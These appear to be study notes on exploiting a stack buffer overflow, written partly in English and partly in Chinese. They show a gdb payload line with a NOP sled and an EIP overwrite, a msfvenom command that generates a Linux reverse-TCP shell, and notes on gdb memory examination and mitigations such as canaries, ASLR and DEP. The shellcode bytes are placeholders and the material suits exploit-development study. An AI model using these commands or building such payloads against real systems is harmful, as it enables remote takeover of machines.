  NOPs = "\x90" * 100
  Shellcode = "\x44" * 150
  EIP = "\x66" * 4

  (gdb) run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')

  msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
  
  x/2000xb $esp+500
    Where x is for examine, 2000 is the number of bytes requested to be examined, 
    the second x displays the bytes formatted in hex, 
    b specifies the unit in which the output is displayed (which in this case is bytes), 
    and at last, $esp+500 specifies the starting display address


这些安全机制包括：
  Canaries      一旦发生缓冲区溢出，金丝雀值将首先被覆盖
  Address Space Layout Randomization (ASLR)      需要猜测地址，而错误的地址很可能会导致程序崩溃，相应地，只有一次尝试机会
  Data Execution Prevention (DEP)      如果某个程序试图以未经授权的方式调用或访问程序代码，DEP 会终止该程序



